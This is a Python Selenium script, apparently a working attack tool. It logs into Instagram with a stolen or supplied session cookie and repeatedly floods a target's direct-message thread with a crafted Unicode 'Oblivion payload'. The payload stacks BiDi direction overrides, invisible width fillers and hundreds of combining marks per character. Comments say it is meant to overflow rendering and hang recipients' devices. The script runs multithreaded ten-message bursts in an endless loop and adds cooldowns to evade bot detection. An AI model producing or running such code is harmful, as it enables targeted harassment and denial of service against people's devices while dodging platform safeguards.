# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (OBLIVION V2 - DEVEL KA ABBU)
# 📅 STATUS: DENSITY x20 | BiDi-RECURSION | 10-BURST WAVE

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 240 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_oblivion_payload(target_name):
    """The Oblivion Payload: Density x20 + BiDi Recursion."""
    # 🌙 CUSTOM HEADER
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLIVION: [{target_name.upper()}]\n"
    
    # 💥 THE 'DIRECTIONAL STACK' (15 layers of nested text direction)
    bidi_recursion = "\u202E\u2066\u202D\u2067\u202B\u2068" * 15
    
    # 💥 THE 'WIDTH-DISPLACER' (Braille Blanks + Non-Breaking Spaces)
    width_bomb = "\u2800\u00A0" * 125 
    
    # 💥 DENSITY x20 (200 Zalgo marks per character)
    # This forces the GPU Command Buffer to overflow instantly.
    z_tower = "̸" * 200
    
    lines = [header, width_bomb, bidi_recursion]
    
    for i in range(75):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # Forces Horizontal Overflow, Vertical Skyscraper, and BiDi Logic Hang
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}{z_tower}{bidi_recursion}")
    
    return "\n".join(lines)[:9990]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    # 🔥 THE 10-BURST WAVE
                    for _ in range(10):
                        payload = get_oblivion_payload(target_name)
                        driver.execute_script("""
                            var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                            if (box) {
                                box.focus();
                                document.execCommand('insertText', false, arguments[0]);
                                box.dispatchEvent(new Event('input', { bubbles: true }));
                                var btns = document.querySelectorAll('div[role="button"]');
                                for(var b of btns) {
                                    if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
                                        b.click();
                                    }
                                }
                            }
                        """, payload)
                        time.sleep(0.01) # Near-zero delay for the burst
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 10-BURST IMPACT DELIVERED", flush=True)
                    time.sleep(random.uniform(6, 10)) # Cooldown to prevent bot detection
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
